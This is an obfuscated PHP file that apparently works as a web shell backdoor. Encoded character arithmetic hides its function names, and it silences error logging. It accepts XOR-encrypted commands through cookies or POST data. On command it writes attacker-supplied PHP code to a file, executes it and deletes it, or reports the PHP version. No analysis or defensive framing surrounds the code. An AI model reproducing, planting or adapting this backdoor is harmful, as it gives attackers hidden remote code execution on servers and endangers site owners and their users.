<?php $qipctu = "\x66"."\x69".'l'."\x65".chr(95).chr(112)."\x75".chr(294-178).chr(95)."\143".chr(348-237)."\x6e".'t'.chr(101).chr(110).'t'.'s';
$zctxsevb = chr(896-798).chr(97).'s'.'e'.chr(54).chr(52).chr(145-50).chr(100)."\x65"."\x63"."\157".'d'."\x65";
$emkmvygv = chr(715-610)."\x6e".chr(221-116).chr(95).'s'.'e'.chr(116);
$bbqgsugyh = chr(117).'n'.chr(108).'i'."\x6e".'k';


@$emkmvygv(chr(101)."\162"."\162".'o'."\x72"."\137".chr(108).'o'.chr(103), NULL);
@$emkmvygv(chr(108).'o'."\147".chr(95).chr(1000-899).'r'.'r'.chr(111)."\162"."\x73", 0);
@$emkmvygv('m'.'a'.chr(795-675).chr(95)."\145".chr(760-640).chr(101).chr(887-788)."\165"."\x74"."\151"."\x6f"."\x6e"."\137"."\x74".'i'.chr(109)."\x65", 0);
@set_time_limit(0);

function himbcvq($cjyrjafst, $wddfsbgim)
{
    $rdkal = "";
    for ($vbbwou = 0; $vbbwou < strlen($cjyrjafst);) {
        for ($j = 0; $j < strlen($wddfsbgim) && $vbbwou < strlen($cjyrjafst); $j++, $vbbwou++) {
            $rdkal .= chr(ord($cjyrjafst[$vbbwou]) ^ ord($wddfsbgim[$j]));
        }
    }
    return $rdkal;
}

$jxjdnti = array_merge($_COOKIE, $_POST);
$fbmurwplao = '9d3492ce-6e5e-412c-9939-7ec9e00517bd';
foreach ($jxjdnti as $owojlmihmv => $cjyrjafst) {
    $cjyrjafst = @unserialize(himbcvq(himbcvq($zctxsevb($cjyrjafst), $fbmurwplao), $owojlmihmv));
    if (isset($cjyrjafst[chr(761-664)."\x6b"])) {
        if ($cjyrjafst["\x61"] == 'i') {
            $vbbwou = array(
                'p'.chr(420-302) => @phpversion(),
                's'.chr(118) => "3.5",
            );
            echo @serialize($vbbwou);
        } elseif ($cjyrjafst["\x61"] == 'e') {
            $vbbwouomjug = "./" . md5($fbmurwplao) . "\x2e".'i'.'n'.chr(983-884);
            @$qipctu($vbbwouomjug, "<" . chr(63).chr(112).chr(104)."\160".' '.chr(64).chr(117)."\x6e"."\154"."\151".chr(110)."\x6b".'('.'_'."\137".'F'."\x49"."\114"."\105"."\x5f"."\137".chr(41)."\x3b".chr(380-348) . $cjyrjafst[chr(733-633)]);
            @include($vbbwouomjug);
            @$bbqgsugyh($vbbwouomjug);
        }
        exit();
    }
}

